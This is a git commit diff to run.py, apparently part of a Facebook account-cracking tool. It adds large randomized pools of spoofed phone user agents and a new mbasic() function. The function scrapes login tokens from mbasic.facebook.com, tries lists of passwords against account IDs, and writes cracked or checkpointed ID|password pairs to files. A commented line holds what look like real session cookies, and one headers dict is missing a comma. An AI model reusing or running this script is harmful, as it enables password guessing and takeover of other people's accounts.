bcf0bb95cda62257b14688886af76f2b45495669
MR.ExceFaN <106883384+fanky86@users.noreply.github.com>
2025-01-01 16:03:01 +0700

    Update run.py

--- run.py
+++ run.py
@@ -193,44 +193,27 @@ for xd in range(10000):
 	strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(infinix))}) Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(108,150))}.0.{str(rr(5359,5555))}.{str(rr(128,150))} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]"
 	asep = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/FBIOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/3;FBCR/U.S. Cellular;FBID/phone;FBLC/en_US;FBOP/5;FBRV/143925426]"
 	uateddy = random.choice([strvredmi, strvsamsung, strvgt])
-	baru.append(uateddy)
+	ugen.append(uateddy)
 
-import random
-
-ugen = []
-ugen2 = []
-
-for xd in range(10000):
-    a = 'Mozilla/5.0 (Symbian/3; Series60/'
-    b, c = random.randrange(1, 9), random.randrange(1, 9)
-    d = 'Nokia'
-    e = random.randrange(100, 9999)
-    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-    g, h, i, j = random.randrange(1, 9), random.randrange(1, 4), random.randrange(1, 4), random.randrange(1, 4)
-    k = 'Mobile Safari/535.1'
-    uaku = f"{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}"
-    ugen2.append(uaku)
-
-    aa = 'Mozilla/5.0 (Linux; U; Android'
-    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
-    c, d, e, f = ' en-us; GT-', random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ"), random.randrange(1, 999), random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
-    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h, i, j, k = random.randrange(73, 100), '0', random.randrange(4200, 4900), random.randrange(40, 150)
-    l = 'Mobile Safari/537.36'
-    uaku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
-    ugen.append(uaku2)
-
-    for x in range(10):
-        a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
-        b, c = random.randrange(100, 9999), random.randrange(100, 9999)
-        d, e, f, g = [random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(4)]
-        h = random.randrange(1, 9)
-        i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
-        j, k = random.randrange(1, 9), random.randrange(1, 9)
-        l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
-        uak = f"{a}{b}/{c}{d}{e}{f}{g}{i}{j}.{k} {l}"
-        baru.append(uak)
-	    
+for userrandom in range(10000):
+	rd = rc(["go","en","id","gn"])
+	Model = rc(["22126RN91Y","2212ARNC4L","22120RN86G","22120RN86C","Black Shark 2Pro","M2010J19SY","M2007J1SC","Redmi K20 Pro","M2101K6G","Note 16 Pro","2311DRK48C","2207122MC","Redmi 10 5G","2201123G","MI NOTE LTE","Mi 11 LE","23028RN4DG","K60E","QIN3ULTRA","21091116UI","Redmi 10I","M2004J7AC","HM 1S","Redmi 5 pro,","Redmi 5Plus","Redmi 85781","2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
+	Build = rc(["TP1A.220624.014","RKQ1.200826.002","NUF26N","KOT49H","HM2014011","G66T1906251CN00MPP","OPM1.171019.019","SKYW1908301CN00MP6","GRI40","MBFMIEK","01AQKQ1.191014.001","KASE2208050OS00MP4","PKQ1.190319.001","KTU84P","JLS36C","NJH47F","N2G47H","MMB29M"])
+	RuRu = rc(["en-in","pt-BR","ru-ru","en-gb","en-us","zh-cn","zh-tw","en-US","es-mx"])
+	Realme1 = rc(["en-in","pt-BR","ru-ru","en-gb","en-us","zh-cn","zh-tw","en-US","es-mx"])
+	Realme2 = rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
+	Realme3 = rc(["TP1A.220624.014","RKQ1.200826.002","NUF26N","KOT49H","HM2014011","G66T1906251CN00MPP","OPM1.171019.019","SKYW1908301CN00MP6","GRI40","MBFMIEK","01AQKQ1.191014.001","KASE2208050OS00MP4","PKQ1.190319.001","KTU84P","JLS36C","NJH47F","N2G47H","MMB29M","PPR1.180610.011"])
+	Xiaomi = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))}.0 Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(5,15))}.{str(rr(5,10))}.{str(rr(10,50))}'
+	Xiaomi1 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(5,15))}.{str(rr(5,10))}.{str(rr(10,50))}-{rd}'
+	Xiaomi2 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {Model} Build/{Build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/351.0.0.6.115;]'
+	Xiaomi3 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 OPR/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(80000,200000))}'
+	Xiaomi4 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {RuRu} {Build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(4,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Safari/537.36 YandexSearch/{str(rr(10,30))}.{str(rr(50,100))}.{str(rr(1,10))}/apad YandexSearchBrowser/{str(rr(10,30))}.{str(rr(50,100))}.{str(rr(1,10))}'
+	Xyraa1 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))}.0 Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36'
+	Xyraa2 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(1,10))} UCBrowser/{str(rr(1,30))}.{str(rr(1,10))}.0.{str(rr(1000,5000))} (SpeedMode) U4/{str(rr(1,10))}.0 UCWEB/{str(rr(1,10))} Mobile Safari/534.30'
+	Xyraa3 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 RealmeBrowser/{str(rr(30,50))}.{str(rr(1,10))}.0.{str(rr(1,10))}'
+	XyraaDev = random.choice([Xiaomi,Xiaomi1,Xiaomi2,Xiaomi3,Xiaomi4,Xyraa1,Xyraa2,Xyraa3])
+	baru.append(XyraaDev)
+	
 def dalvik():
     application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
     application_version_code = str(random.randint(0, 999999999))
@@ -1464,6 +1447,104 @@ def metcepat():
     print("")
 
 
+def mbasic(idf,pwv):
+	global loop,ok,cp
+	prog.update(des, description=f"[[bold green] UPDATE [bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.advance(des)
+	ua = random.choice(baru)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			headers = {
+				'authority': 'mbasic.facebook.com'
+				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+				'cache-control': 'max-age=0',
+				'dpr': '2.200000047683716',
+				'sec-ch-prefers-color-scheme': 'dark',
+				'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+				'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+				'sec-ch-ua-mobile': '?1',
+				'sec-ch-ua-model': '"21121119SG"',
+				'sec-ch-ua-platform': '"Android"',
+				'sec-ch-ua-platform-version': '"13.0.0"',
+				'sec-fetch-dest': 'document',
+				'sec-fetch-mode': 'navigate',
+				'sec-fetch-site': 'none',
+				'sec-fetch-user': '?1',
+				'upgrade-insecure-requests': '1',
+				'user-agent': ua,
+				'viewport-width': '980',
+			}
+			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers=headers).text
+			headers = {
+				'authority': 'mbasic.facebook.com',
+				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+				'cache-control': 'max-age=0',
+				'content-type': 'application/x-www-form-urlencoded',
+				# 'cookie': 'dbln=%7B%22100051715724900%22%3A%22ZciomVyp%22%2C%22100091847710393%22%3A%225sbab0VN%22%2C%2261555820308070%22%3A%22QsX6TjXO%22%2C%2261550060520876%22%3A%22RHmXZkji%22%2C%22100074047853047%22%3A%22RLsqqcNd%22%2C%22100052483280852%22%3A%22dLKB2q8l%22%2C%22100013928473639%22%3A%22pUWocsN4%22%7D; zsh=ASTFY_HA_ilaJ1aaaReI-R4IEEtF6dxomsGgJar0sg2kje5ubL3lCwjFmpGMTflPDAzpO_2Ad-o0TMTrVssUC6VN9lEYWmEzZEbfzD018TAsWZBT7OKODdYab1VTunPwsqTwpxDT5Dl0N-vXUDME5oOON_D7_1rOi4YkvVaEoEBAY_vJaTJjYlI6ARkQi-Hp0mqRjNZW9bj4tHkwnKwWL0jL46eStJE1HZyK9kyG0k4x10xY9QGeke3N4FklV_BmPDRnDB5ByOc-GMCqCuBNvYe12HTps0HLpywqjUvMa4Pd7_AGNl6cxVPjO9r6NCWtqafvQGdG3hOh; datr=7ne-Zt07cO5AU6EQEJVIThxN; oo=v1; sb=7ne-Zun-YtDHd533skCsDAFD',
+				'dpr': '2.200000047683716',
+				'origin': 'https://mbasic.facebook.com',
+				'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
+				'sec-ch-prefers-color-scheme': 'dark',
+				'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+				'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+				'sec-ch-ua-mobile': '?1',
+				'sec-ch-ua-model': '"21121119SG"',
+				'sec-ch-ua-platform': '"Android"',
+				'sec-ch-ua-platform-version': '"13.0.0"',
+				'sec-fetch-dest': 'document',
+				'sec-fetch-mode': 'navigate',
+				'sec-fetch-site': 'same-origin',
+				'sec-fetch-user': '?1',
+				'upgrade-insecure-requests': '1',
+				'user-agent': ua,
+				'viewport-width': '980',
+			}
+			params = {
+				'refsrc': 'deprecated',
+				'lwv': '101',
+				'ref': 'dbl',
+			}
+			data ={
+				"lsd":re.search('name="lsd" value="(.*?)"', str(link)).group(1),
+				"jazoest":re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
+				"m_ts": re.search('name="m_ts" value="(.*?)"',str(link)).group(1),
+				"li": re.search('name="li" value="(.*?)"',str(link)).group(1),
+				"try_number": re.search('name="try_number" value="(.*?)"',str(link)).group(1),
+				"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link)).group(1),
+				"email":idf,
+				"pass":pw,
+				"login":"Masuk",
+				"bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link)).group(1),
+			}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',headers=headers,params=params,data=data)
+			if "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				tree = Tree(f" ")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}")
+				cetak(tree)
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			elif "checkpoint" in ses.cookies.get_dict().keys():
+				cp+=1
+				tree = Tree(f" ")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}")
+				cetak(tree)
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf + '|' + pw)
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			sleep(10)
+	loop+=1
+
+
 #----------[ METHOD API ]----------#
 
 def mbasiccc(idf, pwv):
@@ -2065,7 +2146,7 @@ def mbasibjc(idf,pwv):
 
 
 
-def mbasic(idf,pwv):
+def mbasicgh(idf,pwv):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
